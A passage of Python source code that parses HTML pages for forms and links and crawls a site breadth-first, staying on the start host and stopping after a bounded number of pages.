# HTML parsing (replaces BeautifulSoup): forms + links
# --------------------------------------------------------------------------

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self._current = {
                "action": attrs.get("action", "") or "",
                "method": (attrs.get("method") or "get").lower(),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._current is not None:
            name = attrs.get("name")
            if name:
                self._current["inputs"].append({
                    "name": name,
                    "type": attrs.get("type", "text"),
                    "value": attrs.get("value", ""),
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "a" and attrs.get("href"):
            self.links.append(attrs["href"])


def extract_forms(html_text):
    p = FormParser()
    try:
        p.feed(html_text)
    except Exception:
        pass
    return p.forms


def extract_links(html_text):
    p = LinkParser()
    try:
        p.feed(html_text)
    except Exception:
        pass
    return p.links

# --------------------------------------------------------------------------
# Crawler - same-host, bounded depth/pages
# --------------------------------------------------------------------------

def build_action_url(base_url, action):
    if not action:
        return base_url
    return urllib.parse.urljoin(base_url, action)


def same_host(url_a, url_b):
    return urllib.parse.urlsplit(url_a).netloc == urllib.parse.urlsplit(url_b).netloc


def crawl(client, start_url, max_pages=20):
    """Returns (list of (page_url, html_text), list of forms as (page_url, form))."""
    seen = set()
    queue = [start_url]
    pages = []
    forms_out = []
    while queue and len(seen) < max_pages:
        url = queue.pop(0)
        if url in seen:
            continue
        seen.add(url)
        resp = client.request(url)
        if resp.error or resp.status == 0:
            continue
        pages.append((url, resp.text))
        for form in extract_forms(resp.text):
            forms_out.append((url, form))
        for href in extract_links(resp.text):
            nxt = urllib.parse.urljoin(url, href)
            nxt = nxt.split("#", 1)[0]
            if nxt not in seen and same_host(nxt, start_url) and nxt.startswith(("http://", "https://")):
                queue.append(nxt)
    return pages, forms_out

